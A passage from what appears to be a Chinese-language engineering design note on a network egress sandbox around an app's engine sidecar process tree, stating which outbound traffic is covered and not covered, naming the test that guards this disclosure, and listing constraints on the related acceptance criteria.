  配过的放行、同类没配的仍拒、**写进可写配置文件的那条仍拒**。

### 覆盖面声明(AC5)

<!-- egress-coverage-statement:begin -->
**这道网络围栏只罩引擎 sidecar 那棵进程树**(引擎自己的模型请求、模型目录、远程 MCP、两处 provider 的 npm 安装,
以及它派生的 shell 工具 / `!command` / MCP stdio / LSP / PTY 终端)。**Electron main**(平台模型目录拉取、登录 / token、
自动更新)**与 renderer 的出网不在覆盖内**,装上策略层之后其行为一点没变(§Q1.4 实测)。不得宣称比这更大的保护面。
<!-- egress-coverage-statement:end -->

用户眼前的同一句话在终端「沙箱开启」悬停卡的第四句(`packages/ui-mac/src/renderer/i18n/{zh,en}.ts`
`alpha.terminal.sandboxHoverBody`)。上面这段与那两句文案都由 `packages/ui-mac/src/main/network-egress-disclosure.test.ts`
守着存在与内容:删掉、或改成「全部出网都被限制」一类的过度声明,判据当场红。

## 用法

本文与老勘破一起,是 `#1073`(REQ-137)AC 与实现票的对照物。三条直接约束:

1. **AC 里凡是引用 §5 那个 profile 形状的地方,要按 §Q1.2 改写**,并且实现票必须自带
   「引擎在这张 profile 下真的能 listen 且 health 200」这条判据 —— `sec5` 臂证明了
   「围栏装上了」与「引擎活着」是两件事,而后者今天没有任何一条判据罩着。
2. **W7 那条静默路径要在网络轴上重新点名**:断的是 DNS,不是端口;而 health 仍 200。
3. **未验的三条(真模型请求 / models 目录 / 代理日志的进程归属)不许在 AC 里写成已知事实。**

任何与本文冲突的断言,先复跑再改文档,不要改实现去迁就散文。
